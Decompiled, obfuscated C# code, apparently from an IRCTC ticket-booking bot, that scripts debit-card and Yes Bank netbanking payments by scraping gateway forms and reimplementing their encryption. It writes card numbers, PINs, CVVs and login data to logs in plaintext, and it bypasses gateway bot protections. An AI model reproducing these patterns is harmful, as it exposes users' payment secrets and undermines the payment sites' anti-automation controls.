                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "PNB Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        if (!string_94.Contains("PGIAuthProcessor?reqid=BDSP002"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Third Hit Failed. Check HTML");
                            return false;
                        }
                        string_91 = string_92;
                        text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                        if (!string_92.Contains("https://"))
                        {
                            string_92 = "https://www.billdesk.com/pgidsk/" + string_92;
                        }
                        text6 = "customerpin=" + text4 + "&" + text6;
                        clsMain.Lock("Fourth Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                            string_90 = "PNB Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Fourth Output htm = " + string_94);
                        if (!string_94.Contains("Your payment request is being processed"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Fourth Hit Failed. Check HTML");
                            return false;
                        }
                        string_91 = string_92;
                        text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                        if (!string_92.Contains("https://"))
                        {
                            string_92 = "https://www.billdesk.com/pgidsk/" + string_92;
                        }
                        clsMain.Lock("Fifth Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                            string_90 = "PNB Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Fifth Output htm = " + string_94);
                        if (!string_94.Contains("https://www.irctc.co.in/eticketing/BankResponse"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Fourth Hit Failed. Check HTML");
                            return false;
                        }
                        if (method_140("msg", string_94).IndexOf("Success", StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            clsMain.Lock("msg doen't contains Success");
                            string_90 = "Payment was failed with PNB Debit";
                            return false;
                        }
                        Thread.Sleep(1000);
                        clsMain.Lock("Success ProcessPNBDebit ");
                        string_89 = string_94;
                        string_90 = string_91;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessPNBDebit", ex.Message);
                    result = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with PNB Debit Payment";
            clsMain.Lock("Html doesn't contains billdesk.com, returning.");
            return false;
        }

        internal bool method_128(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessBOIDebit.");
            string value = "billdesk.com";
            if (string_86.Contains(value))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length < 2)
                {
                    string text7 = "0";
                    string text8 = text3;
                    text3 = text7 + text8;
                }
                try
                {
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "BOI Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("ATM-cum-Debit"))
                    {
                        string text9 = "V";
                        if (text[0] != '6' && !(text.Substring(0, 2) == "50"))
                        {
                            if (text[0] == '5')
                            {
                                text9 = "M";
                            }
                        }
                        else
                        {
                            text9 = "Maestro";
                        }
                        int startIndex = string_94.IndexOf("\"CTR\"");
                        startIndex = string_94.IndexOf("=", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string str = string_94.Substring(startIndex, length);
                        string_91 = string_92;
                        string_92 = "https://www.billdesk.com/pgidsk/PGIMerchantRequestHandler";
                        text6 = "txtBankID=CTR&txtBankID=CTR&txtItemCode=DIRECT&msg=" + HttpUtility.UrlEncode(str) + "&hidOperation=ME100&hidRequestId=PGIME1000";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "BOI Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_94);
                        if (!string_94.Contains("Redirecting to Bank"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        string_91 = string_92;
                        text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                        clsMain.Lock("Third Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "BOI Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Third Output htm = " + string_94);
                        string_91 = string_29;
                        if (!string_94.Contains("BOI Debit Card"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Third Hit Failed. Check HTML");
                            return false;
                        }
                        string_94 = string_94.Replace("'", "\"");
                        while (true)
                        {
                            startIndex = string_94.IndexOf("/pgidsk/PGIImageHandler?rdrid=");
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string text10 = "https://www.billdesk.com" + string_94.Substring(startIndex, length);
                            if (text10.IndexOf("'") > 0)
                            {
                                text10 = text10.Substring(0, text10.IndexOf("'"));
                            }
                            string string_95 = text10;
                            method_56(string_95);
                            frmCaptcha frmCaptcha = new frmCaptcha(clsMain, cookieContainer_, text10, string_91);
                            frmCaptcha.btnReferesh.Enabled = false;
                            frmCaptcha.bool_8 = false;
                            frmCaptcha.bool_9 = true;
                            frmCaptcha.lblWrongCaptcha.Text = "BOI Debit Captcha";
                            frmCaptcha.method_2(clsMain.control_0, clsMain.rectangle_0, "");
                            if (frmCaptcha.DialogResult == DialogResult.OK)
                            {
                                string text11 = frmCaptcha.txtImageData.Text.Trim();
                                frmCaptcha.Dispose();
                                string_92 = "https://www.billdesk.com/pgidsk/PGICTRController";
                                text6 = "cnumber=" + text + "&cardType=" + text9 + "&panreq=" + method_140("panreq", string_94) + "&rdrid=" + method_140("rdrid", string_94) + "&reqid=" + method_140("reqid", string_94) + "&cname2=" + text2.Replace(" ", "+") + "&expmon=" + text3 + "&expyr=" + text4 + "&cvv2=" + text5 + "&Imgver=" + text11;
                                clsMain.Lock("Fourth Hit Inp = " + text6);
                                if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                                {
                                    break;
                                }
                                clsMain.Lock("Fourth Output htm = " + string_94);
                                if (!string_94.Contains("https://www.irctc.co.in/eticketing/BankResponse"))
                                {
                                    if (string_94.IndexOf("Invalid value.Please enter the exect value as shown in the image", StringComparison.CurrentCultureIgnoreCase) <= 0)
                                    {
                                        string_90 = "Failed while processing payment.";
                                        clsMain.Lock("Fourth Hit Failed. Check HTML");
                                        return false;
                                    }
                                    continue;
                                }
                                if (method_140("msg", string_94).IndexOf("%7cApproved", StringComparison.CurrentCultureIgnoreCase) <= 0)
                                {
                                    clsMain.Lock("msg doen't contains |Approved");
                                    string_90 = "Payment was failed with BOI Debit";
                                    return false;
                                }
                                Thread.Sleep(500);
                                clsMain.Lock("Success ProcessBOIDebit ");
                                string_89 = string_94;
                                string_90 = string_29;
                                return true;
                            }
                            frmCaptcha.Dispose();
                            string_90 = "Captcha denied by User.";
                            clsMain.Lock("Captcha denied by User.");
                            return false;
                        }
                        clsMain.Lock("Second Hit Failed. err = " + string_93);
                        string_90 = "BOI Debit Not Working - Payment Failed";
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessBOIDebit", ex.Message);
                    result = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with BOI Debit Payment";
            string string_96 = "Html doesn't contains billdesk.com, returning.";
            clsMain.Lock(string_96);
            return false;
        }

        internal Bitmap method_56(string string_86)
        {
            bool bool_ = false;
            string string_87 = "";
            int int_ = 0;
            DateTime dateTime_ = DateTime.Now.AddMilliseconds(400.0);
            return method_101(string_86, "", webProxy_2, ref cookieContainer_1, true, 40000, ref bool_, ref webException_0, ref string_87, ref dateTime_, ref int_);
        }

        internal bool method_129(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessAndhraDebit. " + string_87);
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "Andhra Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("paymentId"))
                    {
                        string text7 = "ECB";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId\"", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text8);
                        clsMain.Lock("Get Encrypted Data, inp = " + text8 + "||" + text7 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                        text = Class12.smethod_17(text, text8);
                        text2 = Class12.smethod_17(text2, text8);
                        text5 = Class12.smethod_17(text5, text8);
                        string text13 = Class12.smethod_17(text3, text8);
                        string text14 = Class12.smethod_17(text4, text8);
                        if (clsMain.getOTPDelegate_0 != null)
                        {
                            string[] array2 = clsMain.getOTPDelegate_0(text8 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4).Split(new string[1] { "||" }, StringSplitOptions.None);
                            text = array2[0];
                            text2 = array2[1];
                            text5 = array2[2];
                            text13 = array2[3];
                            text14 = array2[4];
                        }
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null && !clsMain.control_0.IsDisposed)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for Andhra Debit.", tCntrlName_, null, null);
                        }
                        string text15 = "3ERRT";
                        string text16 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                        string string_95 = text8 + text9 + text + text2 + "A" + text5 + text15 + "0" + text16 + text11 + "file:////fss50/PGWAYC/config/instupd/6/MERCHANT/5503/CSS/style.css/fss50/PGWAYC/config/instupd/6/MERCHANT/5503/Header/abk1.jpg//fss50//PGWAYF//config////brands//default//label.propertiesCRIShttps://www.irctc.co.in" + text12 + "01010" + 0 + "ANDHRA BANKhttps://www.irctc.co.in/eticketing/BankResponse0055030016550300" + text13 + "D" + text14 + "/fss50/PGWAYC/config/instupd/6/MERCHANT/5503/HTML/footer.html";
                        string string_96 = Class12.smethod_22(text10).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text8 + "&hdndivType=&encCaptcha=" + text9.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text10 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text15 + "&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&paymentId=" + text11 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F6%2FMERCHANT%2F5503%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F6%2FMERCHANT%2F5503%2FHeader%2Fabk1.jpg&labelFile=%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=CRIS&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text12 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=1&ecomFlg=0&captchaFlg=" + 0 + "&instName=ANDHRA+BANK&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=5503001&instId=6&mrchId=5503&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text13 + "&creditDebitCheck=D&debitYear=" + text14 + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2Ffss50%2FPGWAYC%2Fconfig%2Finstupd%2F6%2FMERCHANT%2F5503%2FHTML%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/pgwayf/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/pgwayf/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        int num = (string_94.Substring(startIndex, length).ToUpper().Contains("NOT") ? 1 : 0);
                        if (num != 0)
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessAndhraDebit isPaymentFailed = " + num);
                        string_89 = string_94;
                        string_90 = string_92;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessAndhraDebit", ex.Message);
                }
                finally
                {
                    bool_27 = false;
                }
                return false;
            }
            string_90 = "Some thing went wrong with Andhra Payment";
            clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
            return false;
        }

        private bool method_130(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            int num = 90000;
            int num2 = 0;
            clsMain.Lock("Enter ProcessYesNetBanking.");
            if (string_86.Contains("yesbank"))
            {
                string string_91 = "";
                string string_92 = "";
                string[] array = string_88.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string string_93 = array[1];
                string text2 = "";
                if (array.Length >= 4)
                {
                    text2 = array[3];
                }
                string string_94 = "";
                string string_95 = "";
                string text3 = "";
                try
                {
                    string text4 = class3_0.Method_SerialInp(string_86, ref string_94, false);
                    CookieContainer cookieContainer_ = null;
                    num2++;
                    clsMain.Lock("First Hit : Inp = " + text4);
                    if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_92);
                        string_90 = "yes Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_95);
                    if (!string.IsNullOrEmpty(string_95.Trim()) && string_95.Contains("epiRequestId"))
                    {
                        int startIndex = string_95.IndexOf("epiRequestId") + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        int length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text5 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldMerchCode", startIndex) + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text6 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldMerchName", startIndex) + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text7 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldMerchAcct", startIndex) + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldClientCode", startIndex) + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldMerchRefNbr", startIndex) + 5;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldTxnAmt", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text11 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("fldTxnScAmt", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text12 = string_95.Substring(startIndex, length);
                        string_91 = "https://netbanking.yesbank.co.in/netbanking/RExtLogin.html";
                        string_94 = "https://netbanking.yesbank.co.in/netbanking/entry";
                        text4 = "fldAppId=RR&fldTxnId=LGP&fldScrnSeqNbr=12&fldLangId=eng&fldDeviceId=01";
                        clsMain.Lock("Second Hit : Inp = " + text4);
                        if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_92);
                            string_90 = "Yes Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_95);
                        string_95 = string_95.Replace("'", "\"");
                        startIndex = string_95.IndexOf("l_reqID", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text13 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("l_iterations", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string s = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("loginSalt", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text14 = string_95.Substring(startIndex, length);
                        string text15 = "https://netbanking.yesbank.co.in/netbanking/getUserSalt.jsp?id=" + text;
                        method_100(text15, string_94, null, ref cookieContainer_, true, true, 60000, ref text15, ref bool_19, ref webException_0, ref httpStatusCode_0, ref string_92);
                        if (text15.Length < 5 && !text15.Contains(","))
                        {
                            clsMain.Lock("Salt Hit Failed. err = " + string_92);
                            string_90 = "Salt hit failed - Payment Failed";
                            return false;
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. Yes_Login(2/6)", tCntrlName_, null, null);
                        }
                        string[] array2 = text15.Trim().Split(',');
                        string text16 = array2[0].Trim();
                        string text17 = array2[1].Trim();
                        int result2 = 500;
                        int.TryParse(s, out result2);
                        if (result2 < 100)
                        {
                            result2 = 500;
                        }
                        string text18;
                        if (text17 == "3")
                        {
                            text18 = Class12.smethod_10(string_93).ToUpper();
                            text18 = Class12.smethod_10(text18 + text + text14).ToUpper();
                        }
                        else
                        {
                            text18 = Class12.smethod_19(Class12.smethod_21(string_93, text16, result2)).ToUpper();
                            text18 = Class12.smethod_19(Class12.smethod_21(text18, text14, 500)).ToUpper();
                        }
                        text4 = string.Concat("epiRequestId=", text5, "&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldMerchAcct=", text8, "&fldClientCode=" + text9 + "&fldMerchRefNbr=", text10, "&fldSucStatFlg=N&fldFailStatFlg=N&fldTxnCurr=INR&fldTxnAmt=", text11, "&fldTxnScAmt=", text12, "&fldLoginUserId=", text, "&fldPassword=", text18, "&fldPass=&fldAppId=RR&fldTxnId=LGN&fldScrnSeqNbr=11&fldLangId=eng&fldDeviceId=01&fldAppId=RR&fldTxnId=LGN&fldScrnSeqNbr=11&fldLangId=eng&fldDeviceId=01&fldRequestId=", text13, "&fldUserPwdStatus=", text17, "&fldUserSalt=", text16);
                        string_91 = string_94;
                        clsMain.Lock("Third Hit : Inp = " + text4);
                        if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_92);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Third Hit Output = " + string_95);
                        if (!string_95.Contains("sessionid"))
                        {
                            if (string_95.Contains("Invalid userid / password"))
                            {
                                string_90 = "Invalid userid / password";
                            }
                            else
                            {
                                string_90 = "Yes Login Failed.";
                            }
                            clsMain.Lock("Third Hit, Login Failed, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_95.IndexOf("sessionid") + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text19 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("requestid", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        text13 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("name=\"fldAcctNo") + 7;
                        startIndex = string_95.IndexOf("lue=", startIndex) + 3;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string text20 = string_95.Substring(startIndex, length);
                        string text21 = text20.Split(':')[0];
                        text4 = string.Concat("fldAcctNo=", text20.Replace(":", "%3A"), "&fldAppId=RR&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=", text19, "&fldRequestId=", text13, "&fldCodOrgBrn=0&fldCodCustId=", text, "&epiRequestId=", text5, "&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldMerchAcct=", text8, "&fldClientCode=" + text9 + "&fldMerchRefNbr=", text10, "&fldSucStatFlg=N&fldFailStatFlg=N&fldTxnCurr=INR&fldTxnAmt=", text11, "&fldTxnScAmt=", text12, "&fldCodAcctNo=", text21, "&fldAction=&fldErrorCode=&fldNavToCoupon=N");
                        string_94 = "https://netbanking.yesbank.co.in/netbanking/entry";
                        string_91 = "https://netbanking.yesbank.co.in/netbanking/entry";
                        clsMain.Lock("Fourth Hit : Inp = " + text4);
                        if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Fourth Hit Failed. err = " + string_92);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Fourth Hit Output = " + string_95);
                        if (string_95.Contains("Please choose from the following discount vouchers"))
                        {
                            startIndex = string_95.IndexOf("sessionid") + 7;
                            startIndex = string_95.IndexOf("\"", startIndex) + 1;
                            length = string_95.IndexOf("\"", startIndex) - startIndex;
                            text19 = string_95.Substring(startIndex, length);
                            startIndex = string_95.IndexOf("requestid", startIndex) + 7;
                            startIndex = string_95.IndexOf("\"", startIndex) + 1;
                            length = string_95.IndexOf("\"", startIndex) - startIndex;
                            text13 = string_95.Substring(startIndex, length);
                            string text22 = method_139("fldCodOrgBrn", string_95);
                            text4 = string.Concat("fldSessionId=", text19, "&fldRequestId=", text13, "&fldCodOrgBrn=", text22, "&fldCodCustId=", text, "&fldCodAcctNo=", text21, "&salution=&lastname=&epiRequestId=", text5, "&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldMerchAcct=", text8, "&fldClientCode=" + text9 + "&fldMerchRefNbr=", text10, "&fldSucStatFlg=N&fldFailStatFlg=N&fldTxnCurr=INR&fldTxnAmt=", text11, "&fldTxnScAmt=", text12, "&fldAction=SKIP&fldErrorCode=&fldNavToCoupon=Y&fldLoginUserId=" + text + "&fldRefSysTrAudNo=0&fldNarrative=&fldLoginUserCss=default.css&fldLoginUserType=O&fldLoginUserGroupBaseType=E&fldAppId=RR&fldTxnLimitFlag=N&fldLoginUserToken=RR%3A%3A&fldAccountMapFlag=N&fldScrnSeqNbr=01&fldLoginUserGroupType=N&fldProxyUserFlag=N&fldIdChannel=2&fldTxnId=XFT&fldLoginCustId=" + text + "&fldAcctNo=" + text20.Replace(":", "%3A") + " &fldCouponList=&fldEncRequiredFlag=N&fldChksmRequiredFlag=N");
                            clsMain.Lock("Fifth Hit : Inp = " + text4);
                            if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                            {
                                clsMain.Lock("Fifth Hit Failed. err = " + string_92);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                        }
                        if (updateTStatus_1 != null)
